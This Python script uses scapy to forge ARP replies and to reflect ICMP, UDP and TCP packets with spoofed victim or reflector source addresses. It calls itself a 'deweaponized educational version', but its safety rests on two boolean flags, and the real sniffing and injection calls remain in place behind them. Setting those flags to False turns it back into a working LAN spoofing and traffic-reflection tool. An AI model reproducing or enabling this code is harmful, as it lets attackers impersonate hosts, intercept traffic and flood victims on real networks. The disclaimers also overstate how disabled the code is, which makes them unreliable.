#!/usr/bin/env python3
"""
DEWEAPONIZED EDUCATIONAL VERSION (SAFE TO PUBLISH)

Key functionality has been intentionally obscured/disabled for safety:
- Live packet capture is disabled by default.
- Packet injection (sendp) is replaced with a no-op logger.

This preserves the learning value (protocol parsing, field extraction, control flow),
but prevents use as a live spoofing/traffic reflection tool.
"""

import argparse
import ipaddress
import re
import sys
import random

import scapy.all as scapy

# -------------------------------------------------------------------------------------------------
# Safety switches (publish-safe defaults)
# -------------------------------------------------------------------------------------------------
DISABLE_LIVE_SNIFFING = True          # prevents scapy.sniff from running on an interface
DISABLE_PACKET_INJECTION = True       # prevents forged frames from being transmitted


def safe_sendp(frame, iface=None, verbose=False):
    """
    SAFE SUBSTITUTE for scapy.sendp().

    This intentionally does NOT transmit anything.
    It only prints a short summary that a send would have occurred.
    """
    try:
        print("[SAFE MODE] Blocked packet injection. Would have sent:", frame.summary())
    except Exception:
        print("[SAFE MODE] Blocked packet injection. (Could not summarize frame.)")


descStr = """This program is an educational demonstration of protocol parsing and reflection logic.

IMPORTANT:
This published version has key functionality intentionally obscured/disabled for safety:
- No live sniffing by default.
- No packet injection (sendp is stubbed).
"""

parser = argparse.ArgumentParser(description=descStr)

parser.add_argument('--interface', dest='interface', type=str, required=True,
                    help='Interface name (used for labeling / validation; live sniffing disabled)')
parser.add_argument('--victim-ip', dest='victim_ip', type=str, required=True,
                    help='Victim IP address (educational identity)')
parser.add_argument('--victim-ethernet', dest='victim_ethernet', type=str, required=True,
                    help='Victim MAC address (educational identity)')
parser.add_argument('--reflector-ip', dest='reflector_ip', type=str, required=True,
                    help='Reflector IP address (educational identity)')
parser.add_argument('--reflector-ethernet', dest='reflector_ethernet', type=str, required=True,
                    help='Reflector MAC address (educational identity)')

# Optional: allow offline demonstration using a pcap file (safe)
parser.add_argument('--pcap', dest='pcap', type=str, required=False,
                    help='Optional PCAP file to process offline (safe).')

args = parser.parse_args()

# -------------------------------------------------------------------------------------------------
# Validation
# -------------------------------------------------------------------------------------------------
try:
    ipaddress.ip_address(args.victim_ip)
except ValueError:
    print("Invalid IP address for Victim")
    sys.exit(1)

try:
    ipaddress.ip_address(args.reflector_ip)
except ValueError:
    print("Invalid IP address for Reflector")
    sys.exit(1)

mac_re = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
if not re.match(mac_re, args.victim_ethernet):
    print("Invalid MAC for Victim Ethernet address")
    sys.exit(1)

if not re.match(mac_re, args.reflector_ethernet):
    print("Invalid MAC for Reflector Ethernet address")
    sys.exit(1)

# Interface validation (basic)
try:
    import netifaces
    if args.interface not in netifaces.interfaces():
        print("Invalid interface")
        sys.exit(1)
except Exception:
    print("[NOTE] netifaces not available; skipping interface existence validation.")

interface = args.interface
victim_ip = args.victim_ip
victim_ethernet = args.victim_ethernet
reflector_ip = args.reflector_ip
reflector_ethernet = args.reflector_ethernet

print("Interface =", interface)
print("Victim IP =", victim_ip)
print("Victim Ethernet =", victim_ethernet)
print("Reflector IP =", reflector_ip)
print("Reflector Ethernet =", reflector_ethernet)

print("\n[SAFETY NOTICE] Key functionality is intentionally obscured/disabled for publication:")
print(" - Live sniffing disabled =", DISABLE_LIVE_SNIFFING)
print(" - Packet injection disabled =", DISABLE_PACKET_INJECTION)
print(" - Use --pcap to run an OFFLINE demonstration (safe)\n")


def spoof_ARP_from_Reflector_to_Attacker(packet):
    """
    EDUCATIONAL ONLY (DEWEAPONIZED):
    Parses ARP requests and demonstrates how a forged reply would be constructed.
    Actual transmission is blocked in SAFE MODE.
    """
    try:
        if scapy.ARP not in packet:
            return
        if packet[scapy.ARP].op != 1:  # request
            return

        pdst = packet[scapy.ARP].pdst
        hwsrc = packet[scapy.ARP].hwsrc
        psrc = packet[scapy.ARP].psrc

        if pdst == victim_ip:
            spoofed_ip = victim_ip
            print(f"[ARP] Sender {psrc} requested MAC for victim {victim_ip}")
        elif pdst == reflector_ip:
            spoofed_ip = reflector_ip
            print(f"[ARP] Sender {psrc} requested MAC for reflector {reflector_ip}")
        else:
            return

        arp_reply = scapy.ARP(
            op=2,
            psrc=spoofed_ip,
            hwsrc=reflector_ethernet,
            pdst=psrc,
            hwdst=hwsrc
        )
        ether = scapy.Ether(src=reflector_ethernet, dst=hwsrc) / arp_reply

        print("[ARP] Constructed (non-sent) forged ARP reply:", ether.summary())

        if not DISABLE_PACKET_INJECTION:
            scapy.sendp(ether, iface=interface, verbose=False)
        else:
            safe_sendp(ether, iface=interface, verbose=False)

    except Exception as e:
        print("Error processing ARP packet:", e)


def send_ICMP_packet_from_Reflector_to_Attacker(packet):
    """
    EDUCATIONAL ONLY (DEWEAPONIZED):
    Demonstrates how an ICMP packet could be reflected with a spoofed source IP.
    Actual transmission is blocked in SAFE MODE.
    """
    try:
        if not (scapy.IP in packet and scapy.ICMP in packet and scapy.Ether in packet):
            return

        icmp_pkt = packet.getlayer(scapy.ICMP)

        reflected = (
            scapy.Ether(src=reflector_ethernet, dst=packet[scapy.Ether].src) /
            scapy.IP(src=reflector_ip, dst=packet[scapy.IP].src) /
            scapy.ICMP(type=icmp_pkt.type, code=icmp_pkt.code, id=icmp_pkt.id, seq=icmp_pkt.seq) /
            icmp_pkt.payload
        )

        print("[ICMP] Constructed (non-sent) reflected ICMP packet:", reflected.summary())

        if not DISABLE_PACKET_INJECTION:
            scapy.sendp(reflected, iface=interface, verbose=False)
        else:
            safe_sendp(reflected, iface=interface, verbose=False)

    except Exception as e:
        print("Error processing ICMP packet:", e)


def send_ICMP_packet_from_Victim_to_Attacker(packet):
    """
    EDUCATIONAL ONLY (DEWEAPONIZED):
    Demonstrates an ICMP echo reply that would appear to come from victim_ip.
    Actual transmission is blocked in SAFE MODE.
    """
    try:
        if not (scapy.IP in packet and scapy.ICMP in packet and scapy.Ether in packet):
            return

        icmp_pkt = packet.getlayer(scapy.ICMP)

        reflected = (
            scapy.Ether(src=reflector_ethernet, dst=packet[scapy.Ether].src) /
            scapy.IP(src=victim_ip, dst=packet[scapy.IP].src) /
            scapy.ICMP(type=0, code=0, id=icmp_pkt.id, seq=icmp_pkt.seq) /
            icmp_pkt.payload
        )

        print("[ICMP] Constructed (non-sent) victim-spoofed echo reply:", reflected.summary())

        if not DISABLE_PACKET_INJECTION:
            scapy.sendp(reflected, iface=interface, verbose=False)
        else:
            safe_sendp(reflected, iface=interface, verbose=False)

    except Exception as e:
        print("Error processing ICMP packet:", e)


def send_UDP_packet(packet):
    """
    EDUCATIONAL ONLY (DEWEAPONIZED):
    Demonstrates UDP reflection packet construction.
    Actual transmission is blocked in SAFE MODE.
    """
    try:
        if not (scapy.IP in packet and scapy.UDP in packet and scapy.Ether in packet):
            return

        dst_ip = packet[scapy.IP].dst
        if dst_ip == victim_ip:
            source_ip = reflector_ip
        elif dst_ip == reflector_ip:
            source_ip = victim_ip
        else:
            return

        reflected = (
            scapy.Ether(src=reflector_ethernet, dst=packet[scapy.Ether].src) /
            scapy.IP(src=source_ip, dst=packet[scapy.IP].src) /
            scapy.UDP(sport=packet[scapy.UDP].sport, dport=packet[scapy.UDP].dport)
        )
        if scapy.Raw in packet:
            reflected /= packet[scapy.Raw]

        print("[UDP] Constructed (non-sent) reflected UDP packet:", reflected.summary())

        if not DISABLE_PACKET_INJECTION:
            scapy.sendp(reflected, iface=interface, verbose=False)
        else:
            safe_sendp(reflected, iface=interface, verbose=False)

    except Exception as e:
        print("Error processing UDP packet:", e)


def send_TCP_packet(packet):
    """
    EDUCATIONAL ONLY (DEWEAPONIZED):
    Demonstrates TCP reflection packet construction.
    Actual transmission is blocked in SAFE MODE.
    """
    try:
        if not (scapy.IP in packet and scapy.TCP in packet and scapy.Ether in packet):
            return

        dst_ip = packet[scapy.IP].dst
        if dst_ip == victim_ip:
            source_ip = reflector_ip
        elif dst_ip == reflector_ip:
            source_ip = victim_ip
        else:
            return

        reflected = (
            scapy.Ether(src=reflector_ethernet, dst=packet[scapy.Ether].src) /
            scapy.IP(src=source_ip, dst=packet[scapy.IP].src) /
            scapy.TCP(
                sport=packet[scapy.TCP].sport,
                dport=packet[scapy.TCP].dport,
                seq=packet[scapy.TCP].seq,
                ack=packet[scapy.TCP].ack,
                flags=packet[scapy.TCP].flags,
                options=packet[scapy.TCP].options
            )
        )
        if scapy.Raw in packet:
            reflected /= packet[scapy.Raw]

        try:
            del reflected[scapy.TCP].chksum
            del reflected[scapy.IP].chksum
        except Exception:
            pass

        print("[TCP] Constructed (non-sent) reflected TCP packet:", reflected.summary())

        if not DISABLE_PACKET_INJECTION:
            scapy.sendp(reflected, iface=interface, verbose=False)
        else:
            safe_sendp(reflected, iface=interface, verbose=False)

    except Exception as e:
        print("Error processing TCP packet:", e)


def handle_packet(packet):
    try:
        if packet.haslayer(scapy.ARP):
            spoof_ARP_from_Reflector_to_Attacker(packet)
            return

        if packet.haslayer(scapy.IP):
            src_ip = packet[scapy.IP].src
            dst_ip = packet[scapy.IP].dst

            if packet.haslayer(scapy.ICMP):
                if dst_ip == victim_ip:
                    print(f"[DISPATCH] ICMP to victim: {src_ip} -> {dst_ip}")
                    send_ICMP_packet_from_Reflector_to_Attacker(packet)
                elif dst_ip == reflector_ip:
                    print(f"[DISPATCH] ICMP to reflector: {src_ip} -> {dst_ip}")
                    send_ICMP_packet_from_Victim_to_Attacker(packet)

            elif packet.haslayer(scapy.TCP):
                if dst_ip in (victim_ip, reflector_ip):
                    print(f"[DISPATCH] TCP: {src_ip} -> {dst_ip}")
                    send_TCP_packet(packet)

            elif packet.haslayer(scapy.UDP):
                if dst_ip in (victim_ip, reflector_ip):
                    print(f"[DISPATCH] UDP: {src_ip} -> {dst_ip}")
                    send_UDP_packet(packet)

    except Exception as e:
        print("Error handling packet:", e)


if __name__ == "__main__":
    if args.pcap:
        print(f"[*] Offline processing PCAP (safe): {args.pcap}")
        try:
            pkts = scapy.rdpcap(args.pcap)
            for p in pkts:
                handle_packet(p)
        except Exception as e:
            print("Failed to read/process PCAP:", e)
            sys.exit(1)
    else:
        if DISABLE_LIVE_SNIFFING:
            print("[SAFE MODE] Live sniffing is disabled in this published version.")
            print("          Provide --pcap <file.pcap> to demonstrate offline parsing safely.")
            sys.exit(0)
        else:
            scapy.sniff(iface=interface, prn=handle_packet)
